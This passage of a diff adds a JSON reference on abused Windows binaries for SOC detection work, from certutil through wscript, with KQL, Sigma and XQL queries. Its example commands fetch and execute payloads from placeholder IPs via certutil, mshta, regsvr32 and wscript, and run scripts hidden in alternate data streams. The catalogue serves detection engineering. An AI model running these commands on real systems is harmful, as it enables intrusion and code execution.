@@ -1,0 +1,833 @@
+{
+  "generated": "2026-09-14",
+  "scope": "25 built-in Windows binaries with documented living-off-the-land (LOLBAS-style) abuse patterns, covering download, execution, compilation, application-whitelisting-bypass, and persistence tradecraft relevant to SOC triage and detection engineering.",
+  "count": 25,
+  "note": "All example commands use RFC5737 documentation IP ranges (192.0.2.0/24, 198.51.100.0/24, 203.0.113.0/24) and a fictional corp.local / CORP domain in place of any real attacker-controlled infrastructure or internal hostname.",
+  "lolbins": [
+    {
+      "id": "certutil",
+      "name": "certutil.exe",
+      "path": "C:\\Windows\\System32\\certutil.exe",
+      "category": "Download",
+      "description": "Command-line utility shipped with Windows Certificate Services for managing certificates, certificate authorities, and certificate stores. It is LOLBAS-relevant because its -urlcache, -encode, and -decode switches can download, obfuscate, and reconstruct arbitrary files.",
+      "legitimate_use": "Administrators use certutil to dump/display CA configuration, verify certificates and certificate chains, manage the local certificate store, and install or renew CA certificates.",
+      "attack_techniques": [
+        {"id": "T1105", "name": "Ingress Tool Transfer"},
+        {"id": "T1140", "name": "Deobfuscate/Decode Files or Information"}
+      ],
+      "example_commands": [
+        {"command": "certutil.exe -urlcache -f http://203.0.113.10/payload.exe payload.exe", "purpose": "Downloads and saves a remote file to disk using certutil's URL cache feature"},
+        {"command": "certutil -decode payload.b64 payload.exe", "purpose": "Decodes a Base64-encoded file back to its original binary form"},
+        {"command": "certutil -encode payload.exe payload.b64", "purpose": "Encodes a file as Base64 to evade content-based detection"}
+      ],
+      "detection_queries": {
+        "kql": "DeviceProcessEvents\n| where FileName =~ \"certutil.exe\"\n| where ProcessCommandLine has_any (\"-urlcache\", \"-decode\", \"-encode\", \"-verifyctl\", \"-URL\")\n| project Timestamp, DeviceName, AccountName, ProcessCommandLine, InitiatingProcessFileName",
+        "sigma": "title: Suspicious Certutil Command Usage\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  selection:\n    Image|endswith: '\\certutil.exe'\n    CommandLine|contains:\n      - '-urlcache'\n      - '-decode'\n      - '-encode'\n      - '-verifyctl'\n  condition: selection\nlevel: high",
+        "xql": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter action_process_image_name = \"certutil.exe\"\n| filter action_process_image_command_line contains \"-urlcache\" or action_process_image_command_line contains \"-decode\" or action_process_image_command_line contains \"-encode\"\n| fields agent_hostname, actor_effective_username, action_process_image_command_line"
+      },
+      "false_positives": [
+        "PKI administrators exporting/importing certificates or CA configuration",
+        "Software packaging or integrity tooling using certutil -hashfile for checksums",
+        "Internal scripts decoding Base64-wrapped configuration or log artifacts"
+      ],
+      "defence_guidance": [
+        "Do not blanket-block certutil.exe with AppLocker/WDAC deny rules; it is required for legitimate local CA and certificate-store management on many servers",
+        "Alert on command-line telemetry containing -urlcache, -decode, -encode, or -verifyctl rather than restricting the binary itself",
+        "Flag network connections made by certutil.exe, since normal certificate operations rarely require outbound HTTP"
+      ],
+      "related_lolbins": ["bitsadmin", "mshta", "regsvr32"],
+      "sources": [
+        "https://raw.githubusercontent.com/LOLBAS-Project/LOLBAS/master/yml/OSBinaries/Certutil.yml",
+        "https://attack.mitre.org/techniques/T1105/",
+        "https://attack.mitre.org/techniques/T1140/"
+      ]
+    },
+    {
+      "id": "mshta",
+      "name": "mshta.exe",
+      "path": "C:\\Windows\\System32\\mshta.exe",
+      "category": "Execute",
+      "description": "Executes Microsoft HTML Applications (.hta) using the same rendering engine as Internet Explorer, running embedded JavaScript, JScript, or VBScript outside the browser's sandbox. It is LOLBAS-relevant because it can execute local, remote, or ADS-hidden HTA/script content.",
+      "legitimate_use": "Runs legacy line-of-business HTA desktop applications and internal administrative HTA-based tools that predate modern web app frameworks.",
+      "attack_techniques": [
+        {"id": "T1218.005", "name": "System Binary Proxy Execution: Mshta"}
+      ],
+      "example_commands": [
+        {"command": "mshta.exe http://203.0.113.20/payload.hta", "purpose": "Downloads and executes a remote HTA file, running its embedded script"},
+        {"command": "mshta.exe javascript:a=GetObject(\"script:http://203.0.113.20/payload.sct\").Exec();close();", "purpose": "Executes JScript supplied on the command line that retrieves and runs a remote scriptlet"}
+      ],
+      "detection_queries": {
+        "kql": "DeviceProcessEvents\n| where FileName =~ \"mshta.exe\"\n| where ProcessCommandLine has_any (\"http://\", \"https://\", \"javascript:\", \"vbscript:\")\n| project Timestamp, DeviceName, AccountName, ProcessCommandLine, InitiatingProcessFileName",
+        "sigma": "title: Suspicious Mshta Child Process or Script Execution\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  selection:\n    Image|endswith: '\\mshta.exe'\n  susp_args:\n    CommandLine|contains:\n      - 'http://'\n      - 'https://'\n      - 'javascript:'\n      - 'vbscript:'\n  condition: selection and susp_args\nlevel: high",
+        "xql": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter action_process_image_name = \"mshta.exe\"\n| filter action_process_image_command_line contains \"http\" or action_process_image_command_line contains \"javascript:\"\n| fields agent_hostname, actor_effective_username, action_process_image_command_line, causality_actor_process_image_name"
+      },
+      "false_positives": [
+        "Legacy internal HTA-based admin tools or kiosk applications",
+        "Group Policy logon scripts that launch HTA dialogs",
+        "Software vendor installers that use HTA for setup UI"
+      ],
+      "defence_guidance": [
+        "Mshta.exe appears on Microsoft's recommended WDAC/AppLocker block-rule list for high-security baselines; confirm no internal HTA dependency before blocking",
+        "Where blocking is not feasible, alert on mshta.exe spawning network connections or loading .NET CLR libraries (unusual for a scripting host)"
+      ],
+      "related_lolbins": ["certutil", "regsvr32", "cscript"],
+      "sources": [
+        "https://raw.githubusercontent.com/LOLBAS-Project/LOLBAS/master/yml/OSBinaries/Mshta.yml",
+        "https://attack.mitre.org/techniques/T1218/005/"
+      ]
+    },
+    {
+      "id": "rundll32",
+      "name": "rundll32.exe",
+      "path": "C:\\Windows\\System32\\rundll32.exe",
+      "category": "Execute",
+      "description": "Loads a DLL and invokes a named exported function from the command line. It is LOLBAS-relevant because it can execute attacker DLLs, remote SMB-hosted DLLs, JScript via mshtml, and COM server payloads by CLSID.",
+      "legitimate_use": "Used by Windows and many installers/Control Panel items to invoke specific exported DLL functions, such as launching Control Panel applets or post-install actions.",
+      "attack_techniques": [
+        {"id": "T1218.011", "name": "System Binary Proxy Execution: Rundll32"}
+      ],
+      "example_commands": [
+        {"command": "rundll32.exe payload.dll,EntryPoint", "purpose": "Executes the named exported function inside an attacker-supplied DLL"},
+        {"command": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:http://203.0.113.30/payload.sct\")", "purpose": "Uses the mshtml RunHTMLApplication entry point to execute a remote JScript scriptlet"}
+      ],
+      "detection_queries": {
+        "kql": "DeviceProcessEvents\n| where FileName =~ \"rundll32.exe\"\n| where ProcessCommandLine has_any (\"javascript:\", \"http://\", \"https://\", \"-sta\")\n| project Timestamp, DeviceName, AccountName, ProcessCommandLine",
+        "sigma": "title: Suspicious Rundll32 Activity\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  selection:\n    Image|endswith: '\\rundll32.exe'\n    CommandLine|contains:\n      - 'javascript:'\n      - '.sct'\n      - '-sta'\n  condition: selection\nlevel: medium",
+        "xql": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter action_process_image_name = \"rundll32.exe\"\n| filter action_process_image_command_line contains \"javascript:\" or action_process_image_command_line contains \".sct\"\n| fields agent_hostname, actor_effective_username, action_process_image_command_line"
+      },
+      "false_positives": [
+        "Control Panel applets and printer/driver DLLs invoked via rundll32 by Windows itself",
+        "Software installers calling rundll32 for signed post-install DLL actions",
+        "Legitimate shell32.dll or user32.dll helper function calls used by scripts"
+      ],
+      "defence_guidance": [
+        "Rundll32 cannot be blocked outright since Windows itself depends on it; use WDAC to restrict which DLL paths/exports may be loaded",
+        "Alert on rundll32.exe making outbound network connections or loading unsigned DLLs from user-writable directories"
+      ],
+      "related_lolbins": ["regsvr32", "control", "odbcconf"],
+      "sources": [
+        "https://raw.githubusercontent.com/LOLBAS-Project/LOLBAS/master/yml/OSBinaries/Rundll32.yml",
+        "https://attack.mitre.org/techniques/T1218/011/"
+      ]
+    },
+    {
+      "id": "regsvr32",
+      "name": "regsvr32.exe",
+      "path": "C:\\Windows\\System32\\regsvr32.exe",
+      "category": "Bypass",
+      "description": "Registers and unregisters DLLs and OCX controls, calling their DllRegisterServer/DllUnregisterServer exports. It is LOLBAS-relevant for the well-known 'Squiblydoo' technique, which loads and executes a remote .sct scriptlet via scrobj.dll while bypassing application whitelisting.",
+      "legitimate_use": "Used by software installers and administrators to register COM components and ActiveX controls with the Windows registry.",
+      "attack_techniques": [
+        {"id": "T1218.010", "name": "System Binary Proxy Execution: Regsvr32"}
+      ],
+      "example_commands": [
+        {"command": "regsvr32 /s /n /u /i:http://203.0.113.40/payload.sct scrobj.dll", "purpose": "Executes a remote .sct scriptlet via scrobj.dll, bypassing application whitelisting (Squiblydoo)"},
+        {"command": "regsvr32.exe /s payload.dll", "purpose": "Registers a DLL, executing attacker code placed in its DllRegisterServer export"}
+      ],
+      "detection_queries": {
+        "kql": "DeviceProcessEvents\n| where FileName =~ \"regsvr32.exe\"\n| where ProcessCommandLine has \"scrobj.dll\" or ProcessCommandLine has \"/i:http\"\n| project Timestamp, DeviceName, AccountName, ProcessCommandLine",
+        "sigma": "title: Regsvr32 Squiblydoo AWL Bypass\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  selection:\n    Image|endswith: '\\regsvr32.exe'\n    CommandLine|contains: 'scrobj.dll'\n  remote:\n    CommandLine|contains:\n      - 'http://'\n      - 'https://'\n  condition: selection and remote\nlevel: critical",
+        "xql": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter action_process_image_name = \"regsvr32.exe\"\n| filter action_process_image_command_line contains \"scrobj.dll\"\n| fields agent_hostname, actor_effective_username, action_process_image_command_line"
+      },
+      "false_positives": [
+        "Legitimate software installers registering COM DLLs during setup routines",
+        "Line-of-business applications that register ActiveX controls on first run"
+      ],
+      "defence_guidance": [
+        "Microsoft's recommended WDAC block-rule set specifically targets regsvr32 combined with scrobj.dll; apply this rule where scriptlet-based COM registration is not required",
+        "Alert on the /i: remote-URL argument regardless of block state, since it is rarely used in legitimate deployments"
+      ],
+      "related_lolbins": ["mshta", "rundll32", "cmstp"],
+      "sources": [
+        "https://raw.githubusercontent.com/LOLBAS-Project/LOLBAS/master/yml/OSBinaries/Regsvr32.yml",
+        "https://attack.mitre.org/techniques/T1218/010/"
+      ]
+    },
+    {
+      "id": "bitsadmin",
+      "name": "bitsadmin.exe",
+      "path": "C:\\Windows\\System32\\bitsadmin.exe",
+      "category": "Download",
+      "description": "Legacy command-line tool for creating and managing Background Intelligent Transfer Service (BITS) jobs. It is LOLBAS-relevant because BITS jobs can download and execute files while surviving reboots and network interruptions.",
+      "legitimate_use": "Historically used to script resumable background file transfers, such as delivering updates or large payloads without blocking the foreground application.",
+      "attack_techniques": [
+        {"id": "T1105", "name": "Ingress Tool Transfer"}
+      ],
+      "example_commands": [
+        {"command": "bitsadmin /create 1 & bitsadmin /addfile 1 http://203.0.113.50/payload.exe C:\\Users\\Public\\payload.exe & bitsadmin /resume 1 & bitsadmin /complete 1", "purpose": "Creates, populates, and runs a BITS job that downloads a remote file to disk"}
+      ],
+      "detection_queries": {
+        "kql": "DeviceProcessEvents\n| where FileName =~ \"bitsadmin.exe\"\n| where ProcessCommandLine has_any (\"/addfile\", \"/transfer\", \"/create\")\n| project Timestamp, DeviceName, AccountName, ProcessCommandLine",
+        "sigma": "title: Bitsadmin Download or Persistence Job\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  selection:\n    Image|endswith: '\\bitsadmin.exe'\n    CommandLine|contains:\n      - '/addfile'\n      - '/transfer'\n      - 'SetNotifyCmdLine'\n  condition: selection\nlevel: medium",
+        "xql": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter action_process_image_name = \"bitsadmin.exe\"\n| filter action_process_image_command_line contains \"/addfile\" or action_process_image_command_line contains \"SetNotifyCmdLine\"\n| fields agent_hostname, actor_effective_username, action_process_image_command_line"
+      },
+      "false_positives": [
+        "Legacy WSUS or third-party patch-management scripts still invoking bitsadmin directly",
+        "Internal deployment tooling that predates the PowerShell BitsTransfer module"
+      ],
+      "defence_guidance": [
+        "Bitsadmin.exe is deprecated by Microsoft for scripting purposes in favor of the PowerShell BitsTransfer cmdlets, so blocking via WDAC is generally low-impact",
+        "Where BITS itself is required, monitor for SetNotifyCmdLine, which lets a BITS job execute a command on completion"
+      ],
+      "related_lolbins": ["certutil", "wmic"],
+      "sources": [
+        "https://raw.githubusercontent.com/LOLBAS-Project/LOLBAS/master/yml/OSBinaries/Bitsadmin.yml",
+        "https://attack.mitre.org/techniques/T1105/"
+      ]
+    },
+    {
+      "id": "wmic",
+      "name": "wmic.exe",
+      "path": "C:\\Windows\\System32\\wbem\\wmic.exe",
+      "category": "Execute",
+      "description": "Command-line interface to Windows Management Instrumentation (WMI). It is LOLBAS-relevant because 'process call create' can spawn arbitrary processes, and the 'squiblytwo' technique executes JScript/VBScript embedded in a remote XSL stylesheet via wmic's output formatting.",
+      "legitimate_use": "Used by administrators for local and remote system inventory, process management, and WMI-based configuration queries and scripting.",
+      "attack_techniques": [
+        {"id": "T1218", "name": "System Binary Proxy Execution"},
+        {"id": "T1518.001", "name": "Security Software Discovery"}
+      ],
+      "example_commands": [
+        {"command": "wmic.exe process call create \"cmd.exe /c whoami\"", "purpose": "Spawns an arbitrary process using WMI's process call create method"},
+        {"command": "wmic process get brief /format:\"http://203.0.113.60/payload.xsl\"", "purpose": "Executes JScript or VBScript embedded in a remote XSL stylesheet ('Squiblytwo')"},
+        {"command": "WMIC.exe /Namespace:\\\\root\\SecurityCenter2 Path AntiVirusProduct Get displayName,productState", "purpose": "Enumerates installed antivirus/EDR products for reconnaissance"}
+      ],
+      "detection_queries": {
+        "kql": "DeviceProcessEvents\n| where FileName =~ \"wmic.exe\"\n| where ProcessCommandLine has \"process call create\" or ProcessCommandLine has \"/format:\"\n| project Timestamp, DeviceName, AccountName, ProcessCommandLine",
+        "sigma": "title: Wmic Process Create or XSL Script Execution\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  selection_create:\n    Image|endswith: '\\wmic.exe'\n    CommandLine|contains: 'process call create'\n  selection_xsl:\n    Image|endswith: '\\wmic.exe'\n    CommandLine|contains: '/format:'\n  condition: 1 of selection_*\nlevel: high",
+        "xql": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter action_process_image_name = \"wmic.exe\"\n| filter action_process_image_command_line contains \"process call create\" or action_process_image_command_line contains \"/format:\"\n| fields agent_hostname, actor_effective_username, action_process_image_command_line"
+      },
+      "false_positives": [
+        "Legacy remote administration or inventory scripts still using wmic (deprecated but widely present)",
+        "Endpoint security or asset-management agents querying AntiVirusProduct/SecurityCenter2 for compliance reporting"
+      ],
+      "defence_guidance": [
+        "Wmic.exe is deprecated by Microsoft since Windows 10 21H1 and removed by default on newer builds; block via WDAC on estates confirmed not to depend on it",
+        "Where wmic must remain, alert specifically on 'process call create' and '/format:' with a URL or UNC path"
+      ],
+      "related_lolbins": ["msxsl", "rundll32", "bitsadmin"],
+      "sources": [
+        "https://raw.githubusercontent.com/LOLBAS-Project/LOLBAS/master/yml/OSBinaries/Wmic.yml",
+        "https://attack.mitre.org/techniques/T1218/",
+        "https://attack.mitre.org/techniques/T1518/001/"
+      ]
+    },
+    {
+      "id": "installutil",
+      "name": "InstallUtil.exe",
+      "path": "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\InstallUtil.exe",
+      "category": "Bypass",
+      "description": ".NET Framework command-line utility that runs the installer components of a target assembly. It is LOLBAS-relevant because it will execute attacker code placed in custom Installer-class methods, bypassing default AppLocker rules that allow .NET Framework directories.",
+      "legitimate_use": "Installs and uninstalls server resources (such as Windows Services) by executing the Install/Uninstall methods of installer components inside a .NET assembly.",
+      "attack_techniques": [
+        {"id": "T1218.004", "name": "System Binary Proxy Execution: InstallUtil"}
+      ],
+      "example_commands": [
+        {"command": "InstallUtil.exe /logfile= /LogToConsole=false /U payload.dll", "purpose": "Loads a .NET DLL and executes it through InstallUtil's uninstall code path, bypassing AWL"}
+      ],
+      "detection_queries": {
+        "kql": "DeviceProcessEvents\n| where FileName =~ \"installutil.exe\"\n| where ProcessCommandLine has \"/logfile=\" or ProcessCommandLine has \"/U \"\n| project Timestamp, DeviceName, AccountName, ProcessCommandLine, FolderPath",
+        "sigma": "title: InstallUtil Execution Outside Deployment Context\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  selection:\n    Image|endswith: '\\InstallUtil.exe'\n    CommandLine|contains:\n      - '/logfile='\n      - '/LogToConsole=false'\n  condition: selection\nlevel: high",
+        "xql": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter action_process_image_name = \"installutil.exe\"\n| filter action_process_image_command_line contains \"/logfile=\" or action_process_image_command_line contains \"LogToConsole\"\n| fields agent_hostname, actor_effective_username, action_process_image_command_line"
+      },
+      "false_positives": [
+        "Legitimate .NET Windows Service installation during scheduled software deployment",
+        "Developer or build-agent activity registering custom installer assemblies"
+      ],
+      "defence_guidance": [
+        "InstallUtil.exe is on Microsoft's recommended WDAC block-rule list; deny it on standard user endpoints outside maintenance windows",
+        "On systems where it is required, scope allowed execution to known deployment tooling paths and log all invocations"
+      ],
+      "related_lolbins": ["msbuild", "regasm", "csc"],
+      "sources": [
+        "https://raw.githubusercontent.com/LOLBAS-Project/LOLBAS/master/yml/OSBinaries/Installutil.yml",
+        "https://attack.mitre.org/techniques/T1218/004/"
+      ]
+    },
+    {
+      "id": "msbuild",
+      "name": "MSBuild.exe",
+      "path": "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\MSBuild.exe",
+      "category": "Compile",
+      "description": "The Microsoft Build Engine compiles and runs project files, including inline C# tasks embedded directly in XML. It is LOLBAS-relevant because it can build and execute attacker-authored code entirely in memory from a signed Microsoft binary.",
+      "legitimate_use": "Used by Visual Studio and CI/CD pipelines to compile .NET solutions and projects from the command line.",
+      "attack_techniques": [
+        {"id": "T1127.001", "name": "Trusted Developer Utilities Proxy Execution: MSBuild"},
+        {"id": "T1036", "name": "Masquerading"}
+      ],
+      "example_commands": [
+        {"command": "msbuild.exe payload.csproj", "purpose": "Builds and immediately executes an inline C# task embedded in the project file"},
+        {"command": "msbuild.exe @options.rsp", "purpose": "Passes build options via a response file, obscuring the real target from casual command-line review"}
+      ],
+      "detection_queries": {
+        "kql": "DeviceProcessEvents\n| where FileName =~ \"msbuild.exe\"\n| where FolderPath !contains \"Program Files\" or ProcessCommandLine has \".rsp\"\n| project Timestamp, DeviceName, AccountName, ProcessCommandLine, InitiatingProcessFileName",
+        "sigma": "title: Suspicious MSBuild Execution\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  selection:\n    Image|endswith: '\\MSBuild.exe'\n  susp_parent:\n    ParentImage|endswith:\n      - '\\winword.exe'\n      - '\\excel.exe'\n      - '\\powershell.exe'\n      - '\\cmd.exe'\n      - '\\wscript.exe'\n  condition: selection and susp_parent\nlevel: high",
+        "xql": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter action_process_image_name = \"msbuild.exe\"\n| filter causality_actor_process_image_name in (\"winword.exe\", \"excel.exe\", \"powershell.exe\", \"cmd.exe\", \"wscript.exe\")\n| fields agent_hostname, actor_effective_username, action_process_image_command_line, causality_actor_process_image_name"
+      },
+      "false_positives": [
+        "Legitimate CI/CD build agents and developer workstations compiling real project files",
+        "Automated packaging pipelines that call msbuild.exe with response files for build options"
+      ],
+      "defence_guidance": [
+        "Block msbuild.exe via WDAC on non-developer, non-build-server endpoints, where it should never normally run",
+        "On developer/build systems, monitor for msbuild.exe spawned by Office applications, script hosts, or command shells rather than IDEs/build tooling"
+      ],
+      "related_lolbins": ["csc", "installutil", "regasm"],
+      "sources": [
+        "https://raw.githubusercontent.com/LOLBAS-Project/LOLBAS/master/yml/OSBinaries/Msbuild.yml",
+        "https://attack.mitre.org/techniques/T1127/001/",
+        "https://attack.mitre.org/techniques/T1036/"
+      ]
+    },
+    {
+      "id": "regasm",
+      "name": "RegAsm.exe",
+      "path": "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\RegAsm.exe",
+      "category": "Bypass",
+      "description": "The .NET Assembly Registration utility registers COM callable wrappers for .NET assemblies. It is LOLBAS-relevant because loading an attacker DLL causes RegAsm to invoke its RegisterClass/UnregisterClass methods, executing arbitrary code while bypassing default application-whitelisting rules.",
+      "legitimate_use": "Registers .NET assemblies for COM interop so unmanaged COM clients can call into managed code, typically run during installation of COM-interop software.",
+      "attack_techniques": [
+        {"id": "T1218.009", "name": "System Binary Proxy Execution: Regsvcs/Regasm"}
+      ],
+      "example_commands": [
+        {"command": "regasm.exe payload.dll", "purpose": "Loads a .NET DLL and invokes its RegisterClass method, executing attacker code"},
+        {"command": "regasm.exe /U payload.dll", "purpose": "Loads a .NET DLL and invokes its UnregisterClass method as an alternate execution path"}
+      ],
+      "detection_queries": {
+        "kql": "DeviceProcessEvents\n| where FileName =~ \"regasm.exe\"\n| where FolderPath !contains \"Microsoft.NET\" or InitiatingProcessFileName !in (\"msiexec.exe\", \"setup.exe\")\n| project Timestamp, DeviceName, AccountName, ProcessCommandLine, InitiatingProcessFileName",
+        "sigma": "title: Suspicious RegAsm Execution\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  selection:\n    Image|endswith: '\\RegAsm.exe'\n  filter_installers:\n    ParentImage|endswith:\n      - '\\msiexec.exe'\n      - '\\setup.exe'\n  condition: selection and not filter_installers\nlevel: medium",
+        "xql": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter action_process_image_name = \"regasm.exe\"\n| filter causality_actor_process_image_name != \"msiexec.exe\" and causality_actor_process_image_name != \"setup.exe\"\n| fields agent_hostname, actor_effective_username, action_process_image_command_line, causality_actor_process_image_name"
+      },
+      "false_positives": [
+        "Legitimate COM-interop registration performed by .NET application installers",
+        "Developer workstations registering locally built assemblies for interop testing"
+      ],
+      "defence_guidance": [
+        "RegAsm.exe (and its sibling regsvcs.exe) commonly appears in Microsoft's recommended AppLocker/WDAC block-rule sets; deny outside dev/deployment contexts",
+        "Alert on RegAsm.exe loading DLLs from Temp, Downloads, or other user-writable paths"
+      ],
+      "related_lolbins": ["installutil", "msbuild"],
+      "sources": [
+        "https://raw.githubusercontent.com/LOLBAS-Project/LOLBAS/master/yml/OSBinaries/Regasm.yml",
+        "https://attack.mitre.org/techniques/T1218/009/"
+      ]
+    },
+    {
+      "id": "csc",
+      "name": "csc.exe",
+      "path": "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe",
+      "category": "Compile",
+      "description": "The C# compiler bundled with the .NET Framework. It is LOLBAS-relevant because it can compile attacker-supplied C# source into an executable or DLL directly on the host, evading detections that rely on scanning pre-built binaries.",
+      "legitimate_use": "Compiles C# source code from the command line; also invoked transparently by PowerShell's Add-Type cmdlet and by Visual Studio build processes.",
+      "attack_techniques": [
+        {"id": "T1127", "name": "Trusted Developer Utilities Proxy Execution"}
+      ],
+      "example_commands": [
+        {"command": "csc.exe -out:payload.exe payload.cs", "purpose": "Compiles attacker-supplied C# source directly into an executable on the host"},
+        {"command": "csc -target:library payload.cs", "purpose": "Compiles C# source into a DLL with the same base name"}
+      ],
+      "detection_queries": {
+        "kql": "DeviceProcessEvents\n| where FileName =~ \"csc.exe\"\n| where InitiatingProcessFileName !in~ (\"devenv.exe\", \"msbuild.exe\", \"powershell.exe\")\n| project Timestamp, DeviceName, AccountName, ProcessCommandLine, InitiatingProcessFileName",
+        "sigma": "title: Suspicious Csc.exe Compilation\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  selection:\n    Image|endswith: '\\csc.exe'\n  filter_dev:\n    ParentImage|endswith:\n      - '\\devenv.exe'\n      - '\\msbuild.exe'\n  condition: selection and not filter_dev\nlevel: medium",
+        "xql": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter action_process_image_name = \"csc.exe\"\n| filter causality_actor_process_image_name != \"devenv.exe\" and causality_actor_process_image_name != \"msbuild.exe\"\n| fields agent_hostname, actor_effective_username, action_process_image_command_line, causality_actor_process_image_name"
+      },
+      "false_positives": [
+        "Developer workstations and build servers compiling legitimate .NET code",
+        "PowerShell scripts using Add-Type, which silently invokes csc.exe to compile inline C# snippets"
+      ],
+      "defence_guidance": [
+        "Block csc.exe via WDAC on non-developer endpoints; where PowerShell Add-Type is used legitimately, test thoroughly before blocking since it will break",
+        "On developer systems, baseline expected parent processes (IDE/build tooling) and alert on unexpected parents such as Office apps or script hosts"
+      ],
+      "related_lolbins": ["msbuild", "installutil"],
+      "sources": [
+        "https://raw.githubusercontent.com/LOLBAS-Project/LOLBAS/master/yml/OSBinaries/Csc.yml",
+        "https://attack.mitre.org/techniques/T1127/"
+      ]
+    },
+    {
+      "id": "cscript",
+      "name": "cscript.exe",
+      "path": "C:\\Windows\\System32\\cscript.exe",
+      "category": "Execute",
+      "description": "Console-based host for the Windows Script Host, executing VBScript and JScript files. It is LOLBAS-relevant because it can run script code stored inside an NTFS Alternate Data Stream, hiding it from normal directory listings.",
+      "legitimate_use": "Runs administrative VBScript/JScript logon scripts and legacy automation tooling from the command line without a GUI.",
+      "attack_techniques": [
+        {"id": "T1564.004", "name": "Hide Artifacts: NTFS File Attributes"}
+      ],
+      "example_commands": [
+        {"command": "cscript //e:vbscript notes.txt:script.vbs", "purpose": "Executes a VBScript engine against script code stored in an Alternate Data Stream of notes.txt"}
+      ],
+      "detection_queries": {
+        "kql": "DeviceProcessEvents\n| where FileName =~ \"cscript.exe\"\n| where ProcessCommandLine has \":\" and ProcessCommandLine matches regex @\"[A-Za-z0-9_.]+:[A-Za-z0-9_.]+\"\n| project Timestamp, DeviceName, AccountName, ProcessCommandLine",
+        "sigma": "title: Cscript Executing From Alternate Data Stream\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  selection:\n    Image|endswith: '\\cscript.exe'\n    CommandLine|re: '\\w+\\.\\w+:\\w+\\.(vbs|js)'\n  condition: selection\nlevel: high",
+        "xql": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter action_process_image_name = \"cscript.exe\"\n| filter action_process_image_command_line contains \":\" \n| fields agent_hostname, actor_effective_username, action_process_image_command_line"
+      },
+      "false_positives": [
+        "Legacy VBScript-based logon/logoff scripts run at scale via Group Policy",
+        "Legitimate administrative automation predating PowerShell adoption"
+      ],
+      "defence_guidance": [
+        "Cscript.exe is often required for legacy logon scripts, so avoid an outright block; monitor for command lines containing a colon inside a filename argument (ADS indicator)",
+        "Consider disabling Windows Script Host globally via policy on estates with no VBS/JS dependency"
+      ],
+      "related_lolbins": ["wscript", "mshta"],
+      "sources": [
+        "https://raw.githubusercontent.com/LOLBAS-Project/LOLBAS/master/yml/OSBinaries/Cscript.yml",
+        "https://attack.mitre.org/techniques/T1564/004/"
+      ]
+    },
+    {
+      "id": "wscript",
+      "name": "wscript.exe",
+      "path": "C:\\Windows\\System32\\wscript.exe",
+      "category": "Execute",
+      "description": "Windows-based host for the Windows Script Host, executing VBScript and JScript files without a console window. It is LOLBAS-relevant because it can run scripts hidden inside an Alternate Data Stream, including scripts downloaded and staged there on the fly.",
+      "legitimate_use": "Runs GUI-less VBScript/JScript automation, historically used for desktop shortcuts, installer helper scripts, and simple automation tasks.",
+      "attack_techniques": [
+        {"id": "T1564.004", "name": "Hide Artifacts: NTFS File Attributes"}
+      ],
+      "example_commands": [
+        {"command": "wscript //e:vbscript notes.txt:script.vbs", "purpose": "Executes VBScript code stored in an Alternate Data Stream"},
+        {"command": "echo GetObject(\"script:http://203.0.113.70/payload.js\") > local.txt:hi.js && wscript.exe local.txt:hi.js", "purpose": "Downloads and executes a remote JScript payload via an ADS-staged proxy file"}
+      ],
+      "detection_queries": {
+        "kql": "DeviceProcessEvents\n| where FileName =~ \"wscript.exe\"\n| where ProcessCommandLine has \":\" or ProcessCommandLine has \"GetObject\"\n| project Timestamp, DeviceName, AccountName, ProcessCommandLine",
+        "sigma": "title: Wscript Executing From ADS or Remote Scriptlet\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  selection:\n    Image|endswith: '\\wscript.exe'\n    CommandLine|contains:\n      - 'GetObject'\n      - '.js'\n      - '.vbs'\n  ads_pattern:\n    CommandLine|re: '\\w+\\.\\w+:\\w+\\.(vbs|js)'\n  condition: selection and ads_pattern\nlevel: high",
+        "xql": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter action_process_image_name = \"wscript.exe\"\n| filter action_process_image_command_line contains \"GetObject\" or action_process_image_command_line contains \":\"\n| fields agent_hostname, actor_effective_username, action_process_image_command_line"
+      },
+      "false_positives": [
+        "Legacy VBS-based desktop automation and shortcut launchers",
+        "Older software installers that use wscript.exe helper scripts"
+      ],
+      "defence_guidance": [
+        "Prefer monitoring over blanket blocking due to legacy dependency risk; alert on ADS-pattern command lines (filename:stream) or GetObject(\"script:...\") usage",
+        "Disable Windows Script Host via the WSH Settings registry key on estates confirmed not to need VBS/JS execution"
+      ],
+      "related_lolbins": ["cscript", "mshta"],
